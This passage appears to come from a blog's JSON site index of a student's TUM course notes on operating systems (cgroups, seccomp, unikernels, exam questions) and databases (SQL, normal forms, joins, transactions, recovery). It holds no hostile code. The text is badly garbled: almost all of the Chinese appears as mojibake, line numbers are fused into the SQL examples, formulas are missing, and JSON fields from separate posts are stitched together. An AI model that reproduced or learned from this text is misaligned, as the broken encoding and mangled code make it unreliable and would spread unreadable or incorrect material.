å°†è¿›ç¨‹åˆ’åˆ†ä¸ºå±‚æ¬¡åŒ–çš„ç»„ åˆ†é…( Allozieren )å’Œåˆ†å‘( verteilen )æ¯ä¸€ç»„çš„ç³»ç»Ÿèµ„æº ï¼ˆCPU, å†…å­˜ç­‰ï¼‰ èµ„æºç”±ç‹¬ç«‹çš„ cgroup å­ç³»ç»Ÿè¡¨ç¤º Jedes Subsystem verwaltet eine Hierarchie an Prozessgruppen Accounting Ãœberwacht Seiten, die von den Prozessgruppen verwendet werden ç›‘æ§è¿›ç¨‹ä½¿ç”¨çš„å†…å­˜ Kontrolle weiche Speichergrenzen ç¡®ä¿å†…å­˜é¡µä¼šè¢«å›æ”¶ï¼ˆä½†ä¸æ˜¯å¼ºåˆ¶çš„ï¼Œå³åœ¨ç³»ç»Ÿå‹åŠ›ä¸‹ä¼šä¼˜å…ˆé‡Šæ”¾ï¼Œä½†ä¸ä¼šç«‹å³å¼ºåˆ¶å›æ”¶ï¼‰ harte Speichergrenzen ä¼šè§¦å‘ Out-of-Memory-Killer æ‰€æœ‰è¯¥ cgroup å†…çš„è¿›ç¨‹ä¼šè¢«å†»ç»“ã€‚ OOM Killer å¯èƒ½ä¼šç»ˆæ­¢è¿›ç¨‹æˆ–è°ƒæ•´å†…å­˜é™åˆ¶ã€‚ å¦‚æœå†…å­˜ä½¿ç”¨é‡ä¸‹é™åˆ°é™åˆ¶ä»¥ä¸‹ï¼Œè¿›ç¨‹å¯ä»¥æ¢å¤è¿è¡Œã€‚ Secure Computing Mode (Seccomp)ç”¨äºé™åˆ¶è¿›ç¨‹å¯ä»¥æ‰§è¡Œçš„ç³»ç»Ÿè°ƒç”¨ï¼ˆSystem Callsï¼‰ã€‚ æä¾› 3 ç§æ¨¡å¼ï¼š Disabledï¼š æœªå¯ç”¨ï¼Œå¯ä»¥è°ƒç”¨æ‰€æœ‰ System Call Strictï¼š åªèƒ½è°ƒç”¨4ä¸ªï¼šread(), write(), exit() å’Œ sigreturn() ï¼ˆsigreturn() æ˜¯ä¸€ä¸ª ç³»ç»Ÿè°ƒç”¨ï¼ˆsyscallï¼‰ï¼Œç”¨äº ä»ä¿¡å·å¤„ç†ç¨‹åºï¼ˆsignal handlerï¼‰è¿”å›åˆ°è¢«ä¸­æ–­çš„è¿›ç¨‹ä¸Šä¸‹æ–‡ã€‚ï¼‰ è°ƒç”¨å…¶ä»–çš„ä¼šè§¦å‘SIGKILLä¿¡å·ã€‚ Filterï¼š åªèƒ½ä½¿ç”¨è¢«è¿‡æ»¤è¿‡çš„System Callã€‚ Filterä¼šåŸºäºBerkeley Packet Filter (BPF)ã€‚ åº“æ“ä½œç³»ç»Ÿï¼ˆLibrary OSï¼‰å…¶å®è™šæ‹Ÿæœºï¼ˆVMï¼‰å’ŒContainerè¿˜æ˜¯æœ‰äº›é—®é¢˜çš„ï¼š é€šç”¨æ€§ï¼ˆUniversellï¼‰ï¼šå†…æ ¸ï¼ˆKernelï¼‰å¹¶æœªé’ˆå¯¹ç‰¹å®šåº”ç”¨è¿›è¡Œä¼˜åŒ–ã€‚ é¢å¤–å¼€é”€ï¼ˆOverheadï¼‰ï¼šåŒ…å«æœªä½¿ç”¨çš„ç»„ä»¶ï¼Œå¸¦æ¥ä»¥ä¸‹é—®é¢˜ï¼š é•œåƒï¼ˆAbbilderï¼ŒæŒ‡çš„æ˜¯ VM æˆ–å®¹å™¨çš„ç³»ç»Ÿé•œåƒï¼ˆSystem Imageï¼‰ï¼ŒåŒ…å«æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºçš„æ–‡ä»¶ã€‚ï¼‰è¿‡å¤§ä¼šå¯¼è‡´éƒ¨ç½²ï¼ˆDeploymentï¼ŒæŒ‡çš„æ˜¯ å°† VM æˆ–å®¹å™¨çš„é•œåƒéƒ¨ç½²åˆ°è¿è¡Œç¯å¢ƒä¸­çš„è¿‡ç¨‹ã€‚ï¼‰å˜æ…¢ã€‚ æ”»å‡»é¢ï¼ˆAngriffsfensterï¼‰è¿‡å¤§ï¼Œå¢åŠ å®‰å…¨é£é™©ã€‚ å®¹å™¨é€šå¸¸åªä¸ºä¸€ä¸ªç”¨æˆ·æä¾›ä¸€ä¸ªåº”ç”¨ï¼Œæ‰€ä»¥åŒ…å«è®¸å¤šä¸å¿…è¦çš„åŠŸèƒ½ã€‚ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è€ƒè™‘å°† VM ä½œä¸ºä¸€ä¸ªåº”ç”¨è¿›è¡Œç¼–è¯‘ï¼ˆå³ Library OSï¼‰ï¼Œç”¨äºåˆ›å»ºä¸€ä¸ªæœ€å°åŒ–ã€ä¸“é—¨é’ˆå¯¹ç‰¹å®šåº”ç”¨ä¼˜åŒ–çš„è™šæ‹Ÿæœºã€‚ Library OS ä¼šåƒä¸€ä¸ªåº“ï¼ˆBibliothekï¼‰ä¸€æ ·è¿è¡Œã€‚åœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­ï¼Œä»…åŒ…å«æ‰€éœ€çš„åŠŸèƒ½ï¼Œæ•´ä¸ªç³»ç»Ÿå¯ä»¥é€šè¿‡ç¼–è¯‘å™¨è¿›è¡Œä¼˜åŒ–ã€‚ä¸€èˆ¬åªä¼šè¿è¡Œä¸€ä¸ªè¿›ç¨‹ï¼ˆä½†æ”¯æŒå¤šçº¿ç¨‹ï¼‰ã€‚ Library OS çš„ç†å¿µå¯ä»¥ç†è§£ä¸ºï¼šå°†æ¯ä¸ªåº”ç”¨ç¨‹åºæ‰€ä¾èµ–çš„ OS(æ“ä½œç³»ç»Ÿ) çš„ personality(ç‰¹æ€§) ä½œä¸º library(åº“) ï¼Œä½¿å…¶ç‹¬ç«‹åœ°è¿è¡Œåœ¨è¯¥åº”ç”¨ç¨‹åºçš„åœ°å€ç©ºé—´ä¸Šã€‚ è¿™ç§VM è¢«ç§°ä¸º Unikernelï¼Œæ„å‘³ç€æ‰€æœ‰æ‰§è¡Œéƒ½åœ¨å†…æ ¸æ¨¡å¼ï¼ˆKernel Modeï¼‰è¿›è¡Œï¼Œå¹¶ä¸”åªæœ‰ä¸€ä¸ªåœ°å€ç©ºé—´ï¼Œå› ä¸ºæ•´ä¸ª Unikernel å°±æ˜¯ä¸€ä¸ªå•è¿›ç¨‹åº”ç”¨ã€‚ ç¼ºç‚¹ï¼šåº”ç”¨ç¨‹åºå¿…é¡»ç»å¸¸è¿›è¡Œè°ƒæ•´ï¼ˆangepasset werdenï¼‰ï¼Œå› ä¸ºå®ƒä»¬åœ¨å†…éƒ¨è°ƒç”¨å…¶ä»–åº”ç”¨ç¨‹åºï¼Œä½†æ¶æ„ä¸æ”¯æŒè¿™ç§è°ƒç”¨ã€‚æ ¸å¿ƒåŸå› å°±æ˜¯ä¸æ”¯æŒå¤šä¸ªè¿›ç¨‹äº¤äº’ã€‚ ä¾‹é¢˜ä¾‹é¢˜1Wie viele PIDs hat ein Prozess unter Linux? Eine pro User Eine pro CPU Eine pro cgroup Eine pro Child Eine pro Prozessgruppe Eine pro PID-Namespace ç­”æ¡ˆï¼š6ã€‚ ä¾‹é¢˜2 Welche Voraussetzungen mÃ¼ssen fÃ¼r hardware-unterstÃ¼tzte Virtualisierung erfÃ¼llt sein? Gast kooperiert mit Host-Betriebssystem Syscall-Nummern im Gast- und Host-Kernelsind identisch Gast- und Host-ISA sind identisch Support durch Prozessor PeripheriegerÃ¤te unterstÃ¼tzen SR-IOV Gast-Adressen entsprechen Host-Adressen ç­”æ¡ˆï¼š3ï¼Œ4. è§£é‡Šï¼š","categories":[{"name":"TUM info è¯¾ç¨‹ç¬”è®°","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS æ“ä½œç³»ç»Ÿ","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°/GBS-æ“ä½œç³»ç»Ÿ","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"æ“ä½œç³»ç»Ÿ","slug":"æ“ä½œç³»ç»Ÿ","permalink":"https://archer-baiyi.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"è™šæ‹ŸåŒ–","slug":"è™šæ‹ŸåŒ–","permalink":"https://archer-baiyi.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"},{"name":"è™šæ‹Ÿæœº","slug":"è™šæ‹Ÿæœº","permalink":"https://archer-baiyi.github.io/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"container","slug":"container","permalink":"https://archer-baiyi.github.io/tags/container/"}]},{"title":"GBS-1-EinfÃ¼hrung","slug":"TUM info ç¬”è®°/GBS/GBS-1-EinfÃ¼hrung","date":"2025-03-11T17:15:25.000Z","updated":"2025-04-26T18:30:40.720Z","comments":true,"path":"2025/03/11/TUM info ç¬”è®°/GBS/GBS-1-EinfÃ¼hrung/","permalink":"https://archer-baiyi.github.io/2025/03/11/TUM%20info%20%E7%AC%94%E8%AE%B0/GBS/GBS-1-Einf%C3%BChrung/","excerpt":"æ“ä½œç³»ç»ŸåŸºç¡€ç›¸å…³ç¬”è®°","text":"Grundlagen: Betriebssysteme und SystemsoftwareAufgabe der Informatik:","categories":[{"name":"TUM info è¯¾ç¨‹ç¬”è®°","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS æ“ä½œç³»ç»Ÿ","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°/GBS-æ“ä½œç³»ç»Ÿ","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"æ“ä½œç³»ç»Ÿ","slug":"æ“ä½œç³»ç»Ÿ","permalink":"https://archer-baiyi.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"Datenbank ç¬”è®°","slug":"TUM info ç¬”è®°/Datenbank/Datenbank-ç¬”è®°","date":"2025-03-11T10:37:03.000Z","updated":"2025-04-26T18:30:10.148Z","comments":true,"path":"2025/03/11/TUM info ç¬”è®°/Datenbank/Datenbank-ç¬”è®°/","permalink":"https://archer-baiyi.github.io/2025/03/11/TUM%20info%20%E7%AC%94%E8%AE%B0/Datenbank/Datenbank-%E7%AC%94%E8%AE%B0/","excerpt":"æ•°æ®åº“åŸºç¡€ç›¸å…³ç¬”è®°","text":"1. Datenbankentwurf / ER-ModellierungEntity-relationship diagram FunktionalitÃ¤ten: 1:1, 1:N, N:1, N:M Min-Max: (min,max) MultiplizitÃ¤t 2. Das Relationale ModellSchlÃ¼ssel, PrimÃ¤rschlÃ¼ssel Relationen mit gleichem SchlÃ¼ssel kann man zusammenfassen. Anomalie: å¼‚å¸¸ Die Relationale Algebra Selektion Projektion (ä¼šè‡ªåŠ¨å»é‡) Kreuzprodukt Join (Verbund) Umbenennung Mengendifferenz Division Vereinigung Mengendurchschnitt Semi-Join (linkes Argument wird gefiltert) (ç­›é€‰å·¦è¡¨ï¼Œä»…ä¿ç•™åœ¨å³è¡¨ä¸­æœ‰åŒ¹é…è®°å½•çš„å·¦è¡¨è¡Œã€‚) Semi-Join (rechtes Argument wird gefiltert) Anti-Semi-join âŸ• linker Ã¤uÃŸerer Join (ä¼šä¿ç•™å·¦è¡¨ä¸­çš„æ‰€æœ‰è®°å½•ï¼Œå³ä½¿åœ¨å³è¡¨ä¸­æ²¡æœ‰åŒ¹é…çš„è®°å½•æ—¶ï¼Œå³è¡¨å¯¹åº”çš„ä½ç½®ä¼šä»¥ NULL å¡«å……ã€‚) âŸ– rechter Ã¤uÃŸerer Join âŸ— (voller) Ã¤uÃŸerer Join Der RelationenkalkÃ¼l (relationaler TupelkalkÃ¼l) Bsp.: Der DomÃ¤nenkalkÃ¼l Bsp.: Ã¼ Diese 3 Sprachen sind gleich mÃ¤chtig 3. SQLstandadisierte -Datendefinitions (DDL)- -Datenmanipulations (DML)- -Anfrage (Query)-Sprache Datendefinition (DDL)Datentypen: character(n), char(n) character varying(n), varchar(n) numeric(p,s), integer, decimal pï¼ˆprecisionï¼Œç²¾åº¦ï¼‰ï¼šæ•°å€¼çš„æ€»ä½æ•°ï¼ˆåŒ…å«å°æ•°ç‚¹å‰åçš„æ‰€æœ‰æ•°å­—ï¼‰ã€‚ sï¼ˆscaleï¼Œå°æ•°ä½æ•°ï¼‰ï¼šå°æ•°éƒ¨åˆ†çš„ä½æ•°ï¼ˆå°æ•°ç‚¹åçš„ä½æ•°ï¼‰ã€‚ blob oder raw â€“ fÃ¼r sehr groÃŸe binÃ¤re Daten clob â€“ fÃ¼r sehr groÃŸe String-Attribute date â€“ fÃ¼r Datumsangaben xml â€“ fÃ¼r XML-Dokumente 1234create table Professoren ( PersNr integer not null, Name varchar(30) not null, Rang character(2)); DatenmanipulationEinfÃ¼gen von Tupeln 1234insert into hÃ¶renselect MatrNr, VorlNrfrom Studenten, Vorlesungenwhere Titel = 'Logik'; 12insert into Studenten (MatrNr, Name)values (28121, 'Archimedes'); LÃ¶schen von Tupeln 12delete Studentenwhere Semester &gt; 13; VerÃ¤ndern von Tupeln 12update Studentenset Semester = Semester + 1; Anfrage123select (distinct) asfromwhere and Sortieren: 123select PersNr, Name, Rangfrom Professorenorder by Rang desc, Name asc; Mengenoperation: 1union, intersect, minus 12345selectfromwhere (not) exists (select from where)where not in () æ¯”è¾ƒï¼š 1(where) value &gt;= ALL(å­æŸ¥è¯¢) Aggregationsfunktion: 1avg, max, min, count, sum Gruppierung: 1234selectfrom(where)group by Alle in der select-Klausel aufgefÃ¼hrten Attribute - auÃŸer den aggregierten - auch in der group by-Klausel aufgefÃ¼hrt werden. æ¯”å¦‚è¯´ä¸‹é¢è¿™é‡Œçš„gelesenVon, Nameï¼š 12345select gelesenVon, Name, sum(SWS)from Vorlesungen, Professorenwhere gelesenVon = PersNr and Rang = 'C4'group by gelesenVon, Name having avg(SWS) &gt;=3; Casting: 12cast(expression AS target_data_type)cast(h.AnzProVorl as decimal(6,2)) Allquantor und Implikation: ( \\forall t \\in R \\ (P(t)) ) \\Leftrightarrow ( \\neg (\\exists t \\in R \\ (\\neg P(t))) )(R \\Rightarrow T) \\Leftrightarrow (\\neg R \\lor T)Auswertung bei NULL-Werten and, between, in (1,2,3,4) like mit Platzhalter: â€œ%â€ (fÃ¼r beliebig biele Zeichen) â€œ_â€ (fÃ¼r genau ein Zeichen) case left/right/full outer join Rekursion VorgÃ¤nger des â€Wiener Kreisesâ€œ der Tiefe n: 1234567891011select v1.VorgÃ¤ngerfrom voraussetzen v1, ... voraussetzen vn_minus_1, voraussetzen vn, Vorlesungen vwhere v1.Nachfolger = v2.VorgÃ¤nger and ... vn_minus_1.Nachfolger = vn.VorgÃ¤nger and vn.Nachfolger = v.VorlNr and v.Titel = 'Der Wiener Kreis'; Mit Rekursion: 123456789101112131415161718192021with recursive TransVorl (Vorg, Nachf) as ( -- é€’å½’çš„åŸºç¡€æŸ¥è¯¢ï¼ˆåˆå§‹å±‚çº§ï¼‰ select VorgÃ¤nger, Nachfolger from voraussetzen union all -- é€’å½’éƒ¨åˆ†ï¼ˆä»å‰ä¸€å±‚ç»§ç»­æŸ¥æ‰¾æ›´æ·±çš„å±‚çº§ï¼‰ select t.Vorg, v.Nachfolger from TransVorl t, voraussetzen v where t.Nachf = v.VorgÃ¤nger)select Titel from Vorlesungen where VorlNr in ( select Vorg from TransVorl where Nachf in ( select VorlNr from Vorlesungen where Titel = 'Der Wiener Kreis' )); 4. DatenintegritÃ¤tIntegritÃ¤tsbedingungen: -SchlÃ¼ssel -BeziehungskardinalitÃ¤ten -AttributdomÃ¤nen -Inklusion bei Generalisierung Referentielle IntegritÃ¤t FremdschlÃ¼ssel Ã„nderung von referenzierten Daten: Default ä¼šæ‹’ç»æ‰§è¡Œä¸»é”®çš„æ›´æ”¹æ“ä½œ cascade (Kaskadieren): çº§è”ï¼Œå¤–é”®ä¼šéšç€ä¸»é”®çš„æ›´æ”¹ä¸€èµ·æ›´æ”¹ set NULL Statische IntegritÃ¤tsbedingungen: 12create table Studenten(Semester integer check Semester between 1 and 13) 12create table Prof(Rang character(2) check(Rang in ('C2','C3','C4'))) Konsistenzbedingung: 1234567create table prÃ¼fen(MatrNr Â·Â·Â·VorNr Â·Â·Â·Note Â·Â·Â·primary key (MatrNr,VorNr))constraint VorherHÃ¶ren check (Â·Â·Â·) Trigger: 123456789101112131415161718192021-- 1. create trigger keine Degradierung-- 2.before update on Professorenfor each row-- 3.when (old.Rang is not null)begin-- 4. if :old.Rang = 'C3' and :new.Rang = 'C2' then :new.Rang := 'C3'; end if; if :old.Rang = 'C4' then :new.Rang := 'C4'; end if; if :new.Rang is null then :new.Rang := :old.Rang; end if;end; create trigger Anweisung, gefolgt von einem Namen, der Definition des AuslÃ¶sers, in diesem Fall bevor eine Ã„nderungsoperation (before update on) auf einer Zeile (for each row) der Tabelle Professoren ausgefÃ¼hrt werden kann, einer einschrÃ¤nkenden Bedingung (when) und einer Prozedurdefinition in der Oracle-proprietÃ¤ren Syntax. Temporale Daten 5. Relationale EntwurfstheorieFunktionale AbhÃ¤ngigkeitenFunctional Dependency (FD) A B C D a4 b2 c4 d3 a1 b1 c1 d1 a1 b1 c1 d2 a2 b2 c3 d2 a3 b2 c4 d3 R:= {A,B,C,D} å‡è®¾ : (å¯ä»¥ç†è§£æˆå‡½æ•°çš„ rechtseindeutig) Super-SchlÃ¼ssel : ( ç”Ÿæˆå…ƒ) voll funktional abhÃ¤ngig von () : kann nicht mehr verkleinert werden () Kandidaten-SchlÃ¼ssel: ( æœ€å°ç”Ÿæˆå…ƒ) Armstrong-Axiome FD-HÃ¼lle einer Attributmenge Kanonische Ãœberdeckung æ²¡æœ‰å†—ä½™çš„å±æ€§(Attribute)å’Œä¾èµ–(AbhÃ¤ngigkeit) Berechnung: æ¶ˆé™¤å³éƒ¨å†—ä½™å±æ€§ (, æ—¶ä»…ä¿ç•™ å’Œ ) æ¶ˆé™¤å·¦éƒ¨å†—ä½™å±æ€§ åˆ é™¤å†—ä½™çš„å‡½æ•°ä¾èµ– (ï¼Œï¼Œ æ—¶ä»…ä¿ç•™ å’Œ ) R = R1 R2 2 Korrektheitskriterien fÃ¼r die Zerlegung von Relationenschemata: Verlustlosigkeit AbhÃ¤ngigkeitserhaltung verlustlose Zerlegung: ( R = R1 R2 ) Hinreichende Bedingung fÃ¼r die Verlustlosigkeit einer Zerlegung: oder NormalformenErste Normalform (1NF): Nur atomare DomÃ¤ne. éƒ½è¦æ˜¯singletonï¼Œä¸èƒ½å‡ºç°é›†åˆæˆ–è€…é‡å¤è¡Œ åä¾‹ï¼š Vater Mutter Kinder Johann Martha {Else, Lucie} Johann Maria {Theo, Josef} Heinz Martha {Cleo} æ­£ä¾‹ï¼š Vater Mutter Kind Johann Martha Else Johann Martha Lucie Johann Maria Theo Johann Maria Josef Heinz Martha Cleo Zweite Normalform (2NF)ï¼š falls jedes Nicht(kandidat)schlÃ¼ssel-Attribut voll funktional abhÃ¤ngig ist von jedem KandidatenschlÃ¼ssel der Relation. å‡è®¾R:= {A,B,C,D}çš„Kandidaten-SchlÃ¼sselæ˜¯{A,B},é‚£ä¹ˆéœ€è¦æ»¡è¶³C,D sind voll funktional abhÃ¤ngig von {A,B}ã€‚ åªè¦å‡ºç°ç±»ä¼¼{A} {C}ä¹‹ç±»çš„å°±ä¸è¡Œäº†ã€‚ å¯ä»¥ç†è§£æˆä¸èƒ½æœ‰å¤šä½™åˆ—ã€‚ Remark: å¦‚æœKandidaten-SchlÃ¼sselåªæœ‰ä¸€ä¸ªå…ƒç´ ï¼Œé‚£ä¹ˆä¸€å®šæ»¡è¶³2NFã€‚ åä¾‹ï¼ˆ1é2ï¼‰ï¼š A B C x a 1 x b 1 y c 2 {A,B}ä¸ºKandidaten-SchlÃ¼sselã€‚æœ‰{A} {C}ã€‚ Dritte Normalform (3NF)ï¼š wenn fÃ¼r jede fÃ¼r geltende funktionale AbhÃ¤ngigkeit der Form mit und mindestens eine von drei Bedingungen gilt: , d.h., die FD ist trivial Das Attribut ist in einem KandidatenschlÃ¼ssel von enthalten â€“ also ist prim ist SuperschlÃ¼ssel von å‡å¦‚{A,B}æ˜¯KandidatenschlÃ¼sselï¼Œé‚£ä¹ˆå¯ä»¥{C,D} {A}æ˜¯ç¬¦åˆç¬¬äºŒæ¡è¦æ±‚çš„ã€‚ï¼ˆä½†æ˜¯è¿™ä¸ªä¸æ»¡è¶³åé¢çš„BCNFï¼‰ åä¾‹ï¼ˆ2é3ï¼‰ï¼š A B C D x a 1 n x b 2 m y c 2 m æ»¡è¶³{A,B} {C}ï¼Œ {A,B} {D} vollï¼Œæ‰€ä»¥æ»¡è¶³2NFï¼› æœ‰{C} {D}ï¼Œæ‰€ä»¥ä¸æ»¡è¶³3NFã€‚ Synthesealgorighmus: zerlegen R in R1,â€¦,Rn, sodass: R1,â€¦,Rn verlustlos R1,â€¦,Rn abhÃ¤gigkeitserhaltend Alle R1,â€¦,Rn in 3NF Boyce-Codd-Normalform (BCNF)ï¼š wenn fÃ¼r jede fÃ¼r geltende funktionale AbhÃ¤ngigkeit der Form (FDs) und mindestens eine von drei Bedingungen gilt: , d.h., die FD ist trivial ist SuperschlÃ¼ssel von åä¾‹ï¼ˆ3éBCNFï¼‰ï¼š A B C D x a 1 1 x b 2 1 y a 3 2 y b 2 1 æœ‰ AB CD C B å› ä¸ºBå±äºKandidatschlÃ¼sselï¼Œæ‰€ä»¥æ»¡è¶³3NFï¼Œä½†æ˜¯ä¸æ»¡è¶³BCNFã€‚ Man kann jede Relation verlustlos in BCNF-Relationen zerlegen, aber nicht unbedingt abhÃ¤gigkeitserhaltend. Dekompositions-Algorithmus Mehrwertige AbhÃ¤gigkeit (Multivalued Dependency, MVD): 2è¡Œå¯¹ä¸Šï¼Œ2è¡Œäº¤å‰å¯¹åº” Jede FD is auch eine MVD: Eine MVD ist trivial iff: oder Vierte Normalform (4NF): falls fÃ¼r jede MVD eine der folgenden gilt: Die MVD ist trivial oder ist SuperschlÃ¼ssel von R 6. Physische DatenorganisationSpeicherhierarchieRegister Cache Hauptspeicher Plattenspeicher Archivspeicher RAIDRedundant Arrays of Independent Disks MTTF, MTTR, MTTDL RAID 0: Striping RAID 1: Spiegelung RAID 0+1(10): Striping und Spiegelung RAID 2: Striping auf Bit-Ebene RAID 3: Striping auf Bit-Ebene mit ParitÃ¤tsinfo RAID 4: Striping von BlÃ¶cken RAID 5: Striping von BlÃ¶cken, Verteilung der ParitÃ¤tsblÃ¶cke IndexstrukturenB-BÃ¤umeB+-BÃ¤umeErweiterbares HashingDynamisches Wachsen mÃ¶glich Beispiel: gespiegelte binÃ¤re PersNr h(004) = 00100000â€¦ (4=0â€¦0100) h(006) = 01100000â€¦ (6=0â€¦0110) h(048) = 00001100â€¦ (48=0â€¦0110000) Globale Tiefe Lokale Tiefe R-Baummehrdimensionalen Zugriffsstrukturen 7. AnfragebearbeitungLogische OptimierungKanonische Ãœbersetzung: SQL Relationale Algebra Ã„quivalenzerhaltende Transformationsregeln ä¸€å…±12æ¡ Dependent Join Physische OptimierungNested Loop Joinforeach : â€‹ foreach : â€‹ if s.a=r.a then Res:= Res (r s) O(N*M) Block-Nested Loop Algorithmusforeach Block â€‹ foreach â€‹ foreach â€‹ if s.b = r.a then Res:= Res (r s) O(N * M/B) (M/B: Anzahl der BlÃ¶cke) Index-JoinVoraussetzung: å…¶ä¸­ä¸€ä¸ªè¡¨æ˜¯sortiertçš„ä¸”æœ‰B-Baum O(N * log(M)) Merge-JoinVoraus.: 2ä¸ªè¡¨éƒ½æ˜¯sortiertçš„ O(N+M) linear Hash-Joiné€‰å®šä¸€ä¸ªå“ˆå¸Œå‡½æ•°h()ï¼Œè®¡ç®—R.Açš„å€¼ï¼Œåˆ†é…åˆ°hash bucketsé‡Œï¼Œç„¶åå†è®¡ç®—S.Bçš„å€¼ï¼Œåœ¨å“ˆå¸Œæ¡¶é‡ŒåŒ¹é…ã€‚ ä¸éœ€è¦é¢„å…ˆæ’åº Partitionieren und Hashingçš„è¯éœ€è¦2ä¸ªå“ˆå¸Œå‡½æ•°ã€‚ O(N+M) linear Join mit Hashfilter (Bloom-Filter)éœ€è¦å¾ˆå¤šä¸ªï¼ˆkä¸ªï¼‰ä¸åŒçš„å“ˆå¸Œå‡½æ•°forall : è®¡ç®—h_i(a) forall 0è¦†ç›–1ã€‚ ä¼šå‡ºç°False Positiveï¼Œä½†æ˜¯ä¸ä¼šå‡ºç°False Negative Externes SortierenSelektivitÃ¤t Dynamische Programmierung: Phase: ZugriffsplÃ¤ne ermitteln Phase: Join-PlÃ¤ne ermittel (2-fach, â€¦, n-fach) Phase: Finalisierung 8. TransaktionsverwaltungBegin of Transaction (BOT)ï¼šè½¬è´¦å¼€å§‹çš„æ ‡å¿— readï¼šè¯»å­˜æ¬¾ writeï¼šå†™å…¥ï¼ˆä¿®æ”¹å­˜æ¬¾ï¼Œå‡ºè´¦å…¥è´¦ï¼‰ commitï¼šè½¬è´¦ç»“æŸï¼Œæ‰€æœ‰æ“ä½œfestschreiben abortï¼šå–æ¶ˆè½¬è´¦ï¼Œæ‰€æœ‰çŠ¶æ€å¤åŸ define savepoint backup transaction: Auf den jÃ¼ngsten Sicherungspunkt zurÃ¼cksetzen. commit work rollback work: Alle Ã„nderungen sollen zurÃ¼ckgesetzt werden. ACID: Atomicity (AtomaritÃ¤t)ï¼šåŸå­æ€§ã€‚ Alles oder Nichts. Consistencyï¼šä¸€è‡´æ€§ã€‚ Isolationï¼šéš”ç¦»æ€§ã€‚ Durability (Dauerhaftigkeit)ï¼šæŒä¹…æ€§ã€‚ æ‰€æœ‰æ›´æ”¹éƒ½å¿…é¡»æ°¸ä¹…å­˜å‚¨ã€‚Ã„nderungen erfolgreicher Transaktionen dÃ¼rfen nie verloren gehen. 9. Fehlerbehandlung (Recovery)Fehlerklassifikation Lokaler Fhler in einer noch nicht festgeschriebenen Transaktion Wirkung zurÃ¼cksetztenR1-Recovery Fehler mit Hauptspeicherverlust Abgeschlossene TAs erhalten bleiben R2-Recovery redo Noch nicht abgeschlossene TAs zurÃ¼cksetzten R3-Recovery undo Fehler mit Hintergrundspeicherverlust R4-Recovery stealï¼šæœªæäº¤çš„äº‹åŠ¡ä¿®æ”¹çš„é¡µé¢ä¸ä¼šè¢«æ›¿æ¢ã€‚ stealï¼šå…è®¸æ›¿æ¢ç¼“å­˜ä¸­çš„ä»»ä½•éå›ºå®šé¡µé¢ã€‚ forceï¼šäº‹åŠ¡æäº¤æ—¶ç«‹å³å°†æ•°æ®å†™å…¥ç£ç›˜ã€‚ forceï¼šä¿®æ”¹çš„æ•°æ®ä»å¯ä¿ç•™åœ¨ç¼“å­˜ä¸­ï¼Œæé«˜æ€§èƒ½ã€‚ Auswirkung auf Recovery: force force steal - Kein Undo- Kein Redo - Kein Undo- Redo steal - Undo- Kein Redo - Undo- Redo Einbringungsstrategieï¼ˆæ•°æ®æäº¤ç­–ç•¥ï¼‰: Update in Placeï¼šç›´æ¥è¦†ç›– Twin-Block-Verfahrenï¼šå¤åˆ¶æ•´ä¸ªæ•°æ®å— Schattenspeicherkonzeptï¼šå¤åˆ¶ä¿®æ”¹çš„é¡µé¢ Log-EintrÃ¤ge: LSN (Log Sequence Number)ï¼šæ—¥å¿—åºåˆ—å· Transaktionskennung(TA_ID) PageID Redoï¼šçºªå½•å½“å‰æ“ä½œï¼ˆæ¯”å¦‚è¯´+=50ï¼‰ Undoï¼šå½“å‰æ“ä½œçš„é€†å‘ï¼ˆæ¯”å¦‚-=50ï¼‰ PrevLSNï¼šä¸Šä¸€ä¸ªæ—¥å¿—è®°å½•çš„æŒ‡é’ˆ [LSN, TransaktionsID, PageID, Redo, Undo, PrevLSN] ï¼ˆä¸­æ‹¬å·ï¼‰ Protokollierung: Physische Protokollierung before-imageï¼šä¿®æ”¹å‰çš„Zustand after-image Logische Protokollierung Undo-Code Redo-Code Log-Informationä¼šè®°å½•2æ¬¡ä»¥ä¸Šï¼š Log-Datei R1,R2,R3 Log-Archiv R4 WAL-Prinzip (Write Ahead Log)ï¼š Commitå‰ï¼Œç¡®ä¿æ‰€æœ‰ç›¸å…³çš„æ—¥å¿—è®°å½•å·²å†™å…¥æ—¥å¿—æ–‡ä»¶ã€‚ modifizierte Seite auslagernå‰ï¼Œç¡®ä¿ç›¸å…³æ—¥å¿—è®°å½•å·²å†™å…¥æ—¥å¿—å­˜æ¡£ï¼ˆLog-Archivï¼‰ã€‚ Winnerï¼šåœ¨å´©æºƒå‰å·²ç»å®Œæˆï¼Œéœ€è¦Redo 